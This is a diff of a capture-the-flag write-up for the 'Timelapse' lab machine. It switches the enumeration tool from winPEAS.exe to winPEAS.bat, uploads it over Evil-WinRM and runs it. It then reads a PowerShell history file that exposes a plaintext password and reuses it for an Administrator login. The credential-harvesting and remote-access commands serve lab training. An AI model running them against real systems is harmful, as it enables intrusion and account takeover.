@@ -313,31 +313,61 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 
 <br>
 
-I used winPEAS 
+I used winPEAS - when the exe's don't work you can use the .bat
 
 ```
-[connor@fedora timelapse]$ wget https://github.com/carlospolop/PEASS-ng/releases/download/20220612/winPEASx86.exe
+[connor@fedora timelapse]$ wget https://github.com/carlospolop/PEASS-ng/releases/download/20220612/winPEAS.bat
 ```
 
 <br>
 
 ```
-*Evil-WinRM* PS C:\Users\legacyy\Documents> upload winPEASx86.exe
-Info: Uploading winPEASx86.exe to C:\Users\legacyy\Documents\winPEASx86.exe
+*Evil-WinRM* PS C:\Users\legacyy\Documents> upload winPEAS.bat
+Info: Uploading winPEAS.bat to C:\Users\legacyy\Documents\winPEAS.bat
 
 Enter PEM pass phrase:
                                                              
-Data: 2582528 bytes of 2582528 bytes copied
+Data: 47928 bytes of 47928 bytes copied
 
 Info: Upload successful!
 
+*Evil-WinRM* PS C:\Users\legacyy\Documents> ./winPEAS.bat userinfo
 ```
 
 <br>
 
+Here's an extract from the output:
 
+<br>
 
-cat C:/Users/legacyy/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt
+```
+Checking PS history file
+ Volume in drive C has no label.
+ Volume Serial Number is 22CC-AE66
+
+ Directory of C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+
+03/04/2022  12:46 AM               434 ConsoleHost_history.txt
+               1 File(s)            434 bytes
+               0 Dir(s)   9,944,387,584 bytes free
+```
+
+There are creds in the file:
+
+```
+*Evil-WinRM* PS C:\Users\legacyy\Documents> cat C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+Enter PEM pass phrase:
+whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit
+```
 
 
 evil-winrm -u 'Administrator' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -i 10.10.11.152  -S
